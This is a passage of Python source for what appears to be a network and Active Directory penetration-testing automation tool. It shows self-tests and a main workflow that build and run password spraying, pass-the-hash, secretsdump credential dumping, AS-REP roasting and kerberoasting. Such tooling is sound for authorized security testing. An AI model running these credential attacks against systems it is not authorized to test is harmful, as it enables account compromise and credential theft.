        ("no-hash-cifs-mount", "0123456789abcdef0123456789abcdef" not in " ".join(smb_auth_commands.get("Mount CIFS", [])) and "SHARE" not in " ".join(smb_auth_commands.get("Mount CIFS", [])), "mount actions must be limited to physically mounted, validated shares and never raw NT hashes"),
        ("no-anonymous-pth", "anonymous" not in " ".join(smb_auth_commands.get("Pass-the-Hash", [])).lower(), "anonymous sessions must not generate pass-the-hash commands"),
        ("enum4linux-only-valid-password-anon", "Enum4Linux" in smb_auth_commands and any("-u '' -p ''" in cmd for cmd in smb_auth_commands["Enum4Linux"]) and any("analyst" in cmd for cmd in smb_auth_commands["Enum4Linux"]) and all("admin" not in cmd for cmd in smb_auth_commands["Enum4Linux"]), "enum4linux buttons should cover password/anonymous credentials but not unsupported legacy PTH"),
        ("impacket-secretsdump-added", "impacket-secretsdump" in " ".join(smb_auth_commands.get("Impacket", [])), "SMB Impacket suite should include secretsdump for non-anonymous credentials"),
        ("buttons-have-meaningful-labels", ">-<" not in smb_interaction_html and ">- (" not in smb_interaction_html, "command buttons should never be rendered with '-' labels"),
        ("kerberos-users-copy-list", "USERS" in kerberos_users_html and "Copiar lista completa (2)" in kerberos_users_html and "alice\nbob" in kerberos_users_html, "Kerberos table should expose a copyable complete valid-user list"),
        ("getnpusers-valid-password-syntax", "-p=" not in " ".join(kerberos_test_commands.get("AS-REP Roasting", [])) and "ACME.LOCAL/alice:P@ss:#)" in " ".join(kerberos_test_commands.get("AS-REP Roasting", [])), "GetNPUsers password must be embedded in the target syntax"),
        ("html-control-char-sanitization", "\x00" not in h("domain\x00name"), "HTML renderer should remove NUL/control characters"),
        ("ntlm-short-lm-normalization", normalize_ntlm_hash("0123456789abcdef:0123456789abcdef0123456789abcdef").startswith("aad3b435b51404eeaad3b435b51404ee:"), "invalid short LM components should normalize for Impacket"),
        ("kerbrute-in-deps", "kerbrute" in DEPENDENCIES, "kerbrute should be in DEPENDENCIES list"),
        ("kerbrute-kerberos-commands", "Kerbrute userenum" in kerberos_commands and "kerbrute userenum" in " ".join(kerberos_commands.get("Kerbrute userenum", [])), "Kerberos commands should include kerbrute userenum"),
        ("kerbrute-passwordspray-commands", "Kerbrute passwordspray" in kerberos_commands and "kerbrute passwordspray" in " ".join(kerberos_commands.get("Kerbrute passwordspray", [])), "Kerberos commands should include kerbrute passwordspray"),
        ("kerbrute-parse-valid", parse_kerbrute_results("2024/01/01 12:00:00 >  [+] VALID USERNAME:  admin@DOMAIN.LOCAL")["valid_users"] == ["admin"], "kerbrute parser should extract valid usernames"),
        ("kerbrute-parse-empty", not parse_kerbrute_results("2024/01/01 12:00:00 >  [-] invalid@DOMAIN.LOCAL"), "kerbrute parser should return empty for no valid users"),
    ]
    failures = [f"{name}: {detail}" for name, passed, detail in checks if not passed]
    if failures:
        logger.warn("Self-test failed")
        for failure in failures:
            logger.warn(f"  {failure}")
        logger.warn(f"Self-test artifacts: {state.output_dir}")
        return 1
    logger.info("Self-test passed")
    logger.info(f"Self-test artifacts: {state.output_dir}")
    return 0


def main(argv: list[str]) -> int:
    # Also protects artifacts created by external subprocesses from birth.
    os.umask(0o077)
    parser = build_arg_parser()
    args = parser.parse_args(argv)
    logger = Logger(verbose=args.verbose, quiet=args.quiet)
    try:
        validate_required_cli_input(args)
        validate_cli_file_paths(args)
        if args.self_test:
            return run_self_test(args, logger)
        state = setup_run(args, logger)
        log_startup_context(args, state, logger)
        state.metadata.update(
            {
                "profile": args.profile,
                "threads_level": args.threads_level,
                "web_screenshots": bool(args.web_screenshots),
                "deep_fuzz": bool(args.deep_fuzz),
                "web_wordlist": args.web_wordlist or "",
                "web_common_wordlist": str(first_existing_common_web_wordlist() or ""),
                "web_common_limit": args.web_common_limit if args.web_common_limit is not None else WEB_COMMON_LIMITS.get(args.profile, 120),
                "web_custom_limit": args.web_custom_limit,
                "proxy_enabled": bool(args.proxy),
                "authenticated_enum": bool(
                    args.username
                    or args.password
                    or args.ntlm_hash
                    or args.kerberos
                    or args.username_file
                    or args.password_file
                    or getattr(args, "ntlm_hash_file", None)
                ),
                "username_file": args.username_file or "",
                "password_file": args.password_file or "",
                "ntlm_hash_file": getattr(args, "ntlm_hash_file", None) or "",
                "auth_attack_mode": getattr(args, "auth_attack_mode", "pitchfork") or "pitchfork",
                "credential_lists_execute_automated_spray": has_automated_credential_spray(args),
                "user_enum_enabled": bool(args.enable_user_enum),
            }
        )
        logger.stage("Dependências", "verificando ferramentas locais")
        deps = check_dependencies(state, logger)
        if not args.no_auto_install:
            deps = install_missing_dependencies(state, deps, logger)
        verify_enum4linux_runtime(state, logger)
        logger.stage("Entradas", "validando alvos e importações")
        targets = collect_targets(args)
        targets, warnings = validate_targets(targets)
        for warning in warnings:
            logger.warn(warning)
        if (args.target or args.targets_file) and not targets and not (args.from_nmap or args.from_ip_port or args.resume or args.check_deps):
            raise BirdScanUsageError("Nenhum alvo válido foi encontrado nos argumentos ou no arquivo informado.")
        state.targets = sorted(set(state.targets + targets))
        if args.check_deps and not (targets or args.from_nmap or args.from_ip_port or args.resume):
            save_state(state)
            return 0
        for nmap_file in nmap_import_values(args):
            import_nmap_path(Path(nmap_file), state, logger)
        for ip_port_file in args.from_ip_port or []:
            parse_ip_port_file(Path(ip_port_file), state, logger)
        for target in targets:
            if is_single_ip_or_hostname(target):
                state.upsert_host(target, sources=["cli-target"])
        save_state(state)
        if args.reauth_only:
            logger.stage("Reautenticação", "validando credenciais e executando enumeração pós-auth")
            run_reauth_workflow(args, state, logger)
        else:
            logger.stage("Descoberta", "mapeando hosts, portas e serviços")
            run_nmap_discovery(args, state, targets, logger)
            if args.web_only:
                run_web_catalog(args, state, logger)
            elif args.service_enum_only:
                run_service_enumeration(args, state, logger)
            else:
                run_web_catalog(args, state, logger)
                run_service_enumeration(args, state, logger)
            if service_auth_workflow_enabled(args):
                if has_automated_credential_spray(args):
                    logger.stage("Autenticação", "testando pares autorizados nos serviços compatíveis")
                    run_credential_auth_enumeration(args, state, logger)
                    save_state(state)
                logger.stage("Pós-autenticação", "enum4linux, Kerberos e mapeamento de shares")
                run_enum4linux_for_valid_smb_credentials(args, state, logger)
                run_asrep_roasting(args, state, logger)
                run_kerberoasting(args, state, logger)
                run_smb_share_mapping(args, state, logger)
            else:
                logger.info("Autenticação e pós-auth ignorados pelo escopo web-only/skip-service-enum")
        logger.stage("Relatório", "consolidando resultados úteis e preservando RAW")
        derive_prioritized_findings(state)
        prune_suppressed_evidence(state)
        prune_unreportable_web_endpoints(state)
        save_state(state)
        write_json_export(state)
        write_csv_export(state)
        write_markdown_export(state)
        report_path = generate_html_report(state)
        print_summary(state, report_path, logger)
        if deps.get("nmap") is False and not args.skip_nmap:
            logger.warn("Nmap missing: discovery coverage depends only on imported data.")
        return 0
    except KeyboardInterrupt:
        logger.warn("Interrupted by user")
        return 130
    except BirdScanUsageError as exc:
        logger.warn(str(exc))
        print("", file=sys.stderr)
        parser.print_help(sys.stderr)
        return 2
    except BirdScanError as exc:
        logger.warn(str(exc))
        return 2


def is_single_ip_or_hostname(target: str) -> bool:
    if is_custom_nmap_command(target):
        return False
    if "/" in target:
        return False
    return True


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
